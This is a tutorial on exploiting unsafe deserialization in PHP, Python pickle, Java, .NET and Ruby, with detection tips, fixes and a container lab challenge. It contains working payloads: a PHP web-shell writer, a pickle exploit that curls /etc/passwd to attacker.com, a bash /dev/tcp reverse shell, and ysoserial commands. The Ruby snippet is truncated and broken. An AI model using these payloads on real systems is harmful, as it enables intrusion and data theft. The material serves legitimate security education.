Deserialization

Unsafe deserialization of user-controlled data leading to remote code execution via gadget chains

Overview

Deserialization reconstructs live objects from a byte stream, and any program that does so from user-controlled input lets the attacker choose which classes are instantiated and with what properties. This article explains why that is dangerous, demonstrates exploitable examples in PHP , Python, Java, .NET, YAML , and Ruby, and walks through the gadget-chain tooling that turns a serialized cookie or request body into remote code execution.

Serialization Fundamentals

Serialization converts an object's state into a byte stream for storage or transmission. Deserialization reconstructs the object from that byte stream. The core danger: when a program deserializes attacker-controlled data, the reconstruction process can be hijacked to execute arbitrary code.

Serialization exists because programs need to persist state across network boundaries. A PHP application stores session data. A Python web server caches complex objects in Redis. A Java microservice sends DTOs over RMI. Every language has its own format.

Network Request → Deserialize(User Data) → Object Instantiated → Code Runs

Why Deserialization Is Broken

Object construction is not initialization. In most languages, classes define special methods that run automatically during deserialization. These methods were designed for legitimate reconstruction tasks - restoring database connections, re-attaching file handles, re-validating invariants. But an attacker who controls the serialized payload controls which classes get instantiated, in what order, with what properties.

A gadget chain is a sequence of existing classes in the application's classpath that, when deserialized in a specific order with specific property values, culminates in arbitrary code execution. Each "gadget" does something useful: write to a file, execute a command, make a network request. Chaining them together produces the full exploit.

Gadget A (triggered on deserialization)
  → modifies property of Gadget B
    → Gadget B's destructor fires
      → calls system() with attacker-controlled string

PHP Deserialization

PHP 's serialize() and unserialize() are the oldest and most notorious examples. PHP objects have magic methods - functions with reserved names that the engine calls automatically.

Magic Method Trigger Condition
__wakeup() Called immediately after unserialize()
__destruct() Called when object is destroyed (script end, unset)
__toString() Called when object is cast to string (echo, concatenation)
__construct() Called when object is created with new
__call() Called when invoking inaccessible methods
__get() / __set() Called when reading/writing inaccessible properties
__sleep() Called before serialize(), returns properties to serialize

PHP Serialization Format

O:8:"UserInfo":3:{s:4:"name";s:4:"root";s:3:"uid";i:0;s:7:"isAdmin";b:1;}

Parsed: Object of class UserInfo (8 chars), 3 properties. String name = root (4 chars). Integer uid = 0. Boolean isAdmin = true.

The format encodes type explicitly: s for string, i for integer, b for boolean, d for float, a for array, O for object, N for null.

Exploitable Example

<?php
// File: app/model/Logger.php
class Logger {
    public $log_file;
    public $message;

    function __destruct() {
        file_put_contents($this->log_file, $this->message, FILE_APPEND);
    }
}

// File: public/profile.php
$cookie = base64_decode($_COOKIE['user_data']);
$user = unserialize($cookie);
echo "Welcome, " . $user->name;

The Logger class has a __destruct() that writes to an arbitrary file. The attacker cannot instantiate it directly, but unserialize() can.

Payload construction

<?php
class Logger {
    public $log_file = '/var/www/html/shell.php';
    public $message = '<?php system($_GET["cmd"]); ?>';
}

$payload = serialize(new Logger());
echo base64_encode($payload);
// Output: Tzo2OiJMb2dnZXIiOjI6e3M6ODoibG9nX2ZpbGUiO3M6MjQ6Ii92YXIvd3d3L2h0bWwvc2hlbGwucGhwIjtzOjc6Im1lc3NhZ2UiO3M6MzA6Ijw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ==

Send as cookie, visit /profile.php , then access /shell.php?cmd=id .

Key Exploitation Vectors

1. Modifying property counts to bypass '__wakeup()' (CVE-2016-7124): If the serialized object claims more properties than the class actually has, __wakeup() is skipped, but __destruct() still runs.

// Normal: O:6:"Logger":2:{...}
// Bypass: O:6:"Logger":3:{...}  ← claims 3 properties, has 2

2. PHAR deserialization with 'phar://' wrapper: PHP 's phar:// stream wrapper deserializes metadata when any file operation function touches a PHAR archive. file_exists('phar://evil.phar') triggers deserialization.

<?php
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Logger());
$phar->stopBuffering();

Common Framework Gadget Chains

Monolog (PSR-3 logger)

Monolog's SyslogUdpHandler writes to a UDP socket. BufferHandler flushes on destruct. The chain:

Monolog\Handler\SyslogUdpHandler::__destruct()
  → close() → socket_write()

With controlled host/port, you can exfiltrate data or SSRF .

SwiftMailer

Swift_ByteStream_FileByteStream → __destruct() → unlink()
Swift_ByteStream_TemporaryFileByteStream → path traversal in temp file

Guzzle (HTTP client)

GuzzleHttp\Cookie\FileCookieJar::__destruct()
  → save() → file_put_contents()

Same pattern as the Logger example - arbitrary file write on destruct.

Manual Payload Verification

After constructing a payload, verify it deserializes correctly:

<?php
$payload = 'Tzo2OiJMb2dnZXIiOjI6e3M6ODoibG9nX2ZpbGUiO3M6MjQ6Ii92YXIvd3d3L2h0bWwvc2hlbGwucGhwIjtzOjc6Im1lc3NhZ2UiO3M6MzA6Ijw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ==';
$decoded = base64_decode($payload);
$obj = unserialize($decoded);
var_dump($obj);
// object(Logger)#1 (2) { ["log_file"]=> string(24)... ["message"]=> string(30)... }

Python Pickle Deserialization

Python's pickle module serializes Python objects to a binary format. It's fundamentally unsafe because pickle.loads() executes arbitrary code through the Pickle Virtual Machine (PVM) .

Why Pickle Is Inherently Dangerous

Pickle doesn't serialize data - it serializes instructions for how to reconstruct an object . The P VM is a stack-based interpreter. The R (reduce) opcode calls __reduce__ or __reduce_ex__ on a class, which can return a callable and arguments. The P VM executes that callable.

import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# The payload contains the instructions: load os.system, load 'id', call

# On the victim server:
pickle.loads(payload)  # executes os.system('id')

Pickle Opcodes

Opcode Name Description
c GLOBAL Push a global object (module.name)
( MARK Push mark object onto stack
R REDUCE Pop args and callable, execute
o OBJ Build object (like REDUCE but with class)
S STRING Push a string literal
i INST Instantiate a class
. STOP End of pickle stream

Manual Pickle Payload Construction

import pickle
import pickletools

# Construct a payload that imports os and calls system
# Protocol 0 (ASCII) for readability
exploit = b"cos\nsystem\n(S'id'\ntR."

pickletools.dis(exploit)
#     0: c    GLOBAL     'os system'
#    11: (    MARK
#    12: S        STRING     'id'
#    18: t        TUPLE      (MARK at 11)
#    19: R    REDUCE
#    20: .    STOP

pickle.loads(exploit)  # executes id

Vulnerable Flask App

# app.py
from flask import Flask, request, make_response
import pickle
import base64

app = Flask(__name__)

class UserSession:
    def __init__(self, username, role='user'):
        self.username = username
        self.role = role

def get_session():
    cookie = request.cookies.get('session')
    if not cookie:
        return UserSession('anonymous')
    try:
        decoded = base64.b64decode(cookie.encode())
        return pickle.loads(decoded)
    except:
        return UserSession('anonymous')

@app.route('/')
def index():
    session = get_session()
    return f'Welcome {session.username}, role: {session.role}'

@app.route('/admin')
def admin():
    session = get_session()
    if session.role != 'admin':
        return 'Access denied', 403
    return 'Admin panel - sensitive data here'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

Exploit

import requests
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = 'curl http://attacker.com/$(cat /etc/passwd|base64)'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
r = requests.get('http://target:5000/', cookies={'session': payload})
# Command executes server-side

# Alternative: get a reverse shell
class ReverseShell:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()

Beyond __reduce__ with subprocess

import pickle

# Pickle can call any callable in the global scope
payload = b"csubprocess\ncheck_output\n(S'id'\ntR."
# Calls subprocess.check_output('id')

# Using os.popen for output
payload = b"cos\npopen\n(S'id'\ntR."

Java Deserialization

Java deserialization via ObjectInputStream.readObject() is the most exploited deserialization vulnerability class. The Java runtime has thousands of classes, and many have readObject() , readResolve() , validateObject() methods that do dangerous things.

Java Serialization Magic Bytes

Java serialized objects always start with the magic bytes ac ed 00 05 . If you see these in a base64-encoded cookie or POST body, you've found a Java deserialization endpoint.

echo 'rO0ABXNy...' | base64 -d | xxd | head -1
# 00000000: aced 0005 7372...

Gadget Chain Anatomy

A typical Java gadget chain uses these primitives:

  1. Trigger class - something with a readObject() that does something useful
  2. Transformer class - transforms one object into another
  3. Sink - executes a command, writes a file, loads a class

CommonsCollections chain (simplified)

AnnotationInvocationHandler.readObject()
  → memberValues.entrySet()
    → LazyMap.get()
      → ChainedTransformer.transform()
        → ConstantTransformer (return Runtime.class)
        → InvokerTransformer (Runtime.getRuntime())
        → InvokerTransformer (exec('cmd'))

Detection: URLDNS Gadget

The URLDNS gadget causes a DNS lookup. No dependencies needed. Ideal for blind detection.

java -jar ysoserial.jar URLDNS 'http://YOUR_COLLABORATOR.burpcollaborator.net' \
  | base64 -w0

# Send this as a cookie, POST body, or parameter
# If the target does a DNS lookup for your collaborator domain, you've confirmed deserialization
curl -X POST 'http://target/endpoint' \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @dns.ser

Custom Java Deserialization Test

import java.io.*;
import java.util.Base64;

public class DeserTest {
    public static void main(String[] args) throws Exception {
        // Read base64 payload from ysoserial
        String b64 = "rO0ABXNy...";
        byte[] data = Base64.getDecoder().decode(b64);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        ois.readObject();  // triggers gadget chain
    }
}

.NET Deserialization

.NET deserialization via BinaryFormatter or ObjectStateFormatter (ViewState) is equally dangerous. The standard tool is ysoserial.net .

ViewState Deserialization

ASP.NET ViewState is a base64-encoded hidden field ( __VIEWSTATE ). If EnableViewStateMac=false and the validation key is known/absent, the ViewState can be deserialized to execute code.

# With ysoserial.net (from a Windows machine or via wine)
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "ping attacker.com" --path="/" --apppath="/" --decryptionalg="3DES" \
  --decryptionkey="" --validationalg="SHA1" --validationkey=""

Ruby Marshal Deserialization

Ruby's Marshal.load is analogous to Python's pickle. Universal gadget chains exist.

# Gadget: Gem::Requirement → Gem::DependencyList → eval

  Gem::Requirement.new(["system('id')"])
)
puts Base64.strict_encode64(payload)

Detection

Content-Type Headers

Unusual Content-Type values often indicate serialization endpoints:

application/x-java-serialized-object
application/x-php-serialized
application/x-python-pickle
application/octet-stream
application/x-www-form-urlencoded (with serialized payloads in parameters)

Base64 Detection

Serialized payloads are frequently base64-encoded. Look for long base64 strings in: - Cookies (especially user , session , data , state prefixed cookies) - POST body parameters (e.g., data=rO0ABX... ) - Hidden form fields - URL parameters

Java-specific

# In a base64 cookie, decode and check for Java magic
echo 'rO0ABXNy...' | base64 -d | xxd -g 1 | head -1
# Look for: 00000000: ac ed 00 05 ...

# PHP-specific: look for serialize format markers
echo 'Tzo2OiJVc2VyIjoy...' | base64 -d
# Look for: O:N:"ClassName":N:{...}

Binary scanning

# Scan PCAP for Java serialization magic
tcpdump -r capture.pcap -A 2>/dev/null | grep -a 'ac ed 00 05'

# In a binary file
xxd file.bin | grep 'aced 0005'

Fixes

Do not deserialize untrusted data. This is the only reliable fix. If you must handle serialized data from clients, use safe data formats: JSON , Protocol Buffers, MessagePack.

If you must deserialize

Language Fix
PHP Use json_decode() instead of unserialize(). Validate with allowed_classes in PHP 7+.
Python Use yaml.safe_load(), json.loads(), or pickle with Unpickler.find_class() overridden.
Java Use ValidatingObjectInputStream (Apache Commons IO), ObjectInputFilter (JEP 290, Java 9+).
.NET Use BinaryFormatter allow lists. Migrate to System.Text.Json.
Ruby Use JSON.parse or YAML.safe_load. Use psych safe loader.

Java ObjectInputFilter example (Java 9+)

ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.safe.*;!*"
);
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);

Python Unpickler override

import pickle
import io

class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == 'builtins' and name in {'int', 'str', 'list', 'dict'}:
            return getattr(__import__(module), name)
        raise pickle.UnpicklingError(f'Forbidden: {module}.{name}')

SafeUnpickler(io.BytesIO(data)).load()

HMAC Signing for Integrity

import hmac
import hashlib
import pickle

def secure_dumps(obj, secret):
    data = pickle.dumps(obj)
    sig = hmac.new(secret, data, hashlib.sha256).hexdigest()
    return sig + data.hex()

def secure_loads(token, secret):
    sig = token[:64]
    data = bytes.fromhex(token[64:])
    expected = hmac.new(secret, data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError('Invalid signature')
    return pickle.loads(data)

Common Mistakes

  1. Not confirming the vulnerability type first. Use URL DNS before attempting CommonsCollections RCE . Getting the wrong gadget chain crashes the target or produces visible errors.
  1. Forgetting to encode the payload correctly. Some endpoints expect raw bytes, others expect base64, hex, or URL -encoded base64. Test each.
  1. Using a gadget chain that the target doesn't have the libraries for. Find framework versions first. Run filters/src/main/resources or examine HTTP response headers for library info.
  1. Triggering deserialization but the object isn't used. In PHP , unserialize() alone may not trigger __destruct() if the object is discarded. The object must reach end-of-life in the script.
  1. Firewall blocks outbound connections. In blind deserialization, your payload's network call may be blocked. Test with DNS first ( UDP port 53, often allowed).
  1. PHP deserialization with private/protected properties. These require null bytes in the serialized string. Use Python or a hex editor to construct them:
# Protected property: \x00*\x00property_name
# Private property: \x00ClassName\x00property_name
payload = b'O:6:"Logger":2:{s:12:"\x00*\x00log_file";s:4:"test";s:14:"\x00Logger\x00message";s:6:"hello";}'
  1. Ignore the 'sleep' magic method. Before serialize() is called, __sleep() runs. You can chain through it if it returns interesting properties or triggers side effects.

Challenge

The companion container runs three vulnerable endpoints: a Python Flask app that unpickles a cookie, a Java Tomcat servlet that calls ObjectInputStream.readObject() , and a PHP Apache host that calls unserialize() . Build it, identify each endpoint, and use the matching gadget tool to reach code execution.

deserialization.Containerfile

podman build -t deser-lab -f deserialization.Containerfile .

podman run -d --name deser-lab \
    -p 5000:5000 -p 8080:8080 -p 8081:8081 \
    deser-lab

# Python Flask (pickle): http://localhost:5000
# Java Tomcat (ObjectInputStream): http://localhost:8080/deser/api
# PHP Apache (unserialize): http://localhost:8081

Build the pickle payload with __reduce__ , the Java payload with ysoserial , and the PHP payload with phpggc , then submit each one to its endpoint and confirm execution with a callback or a file write.
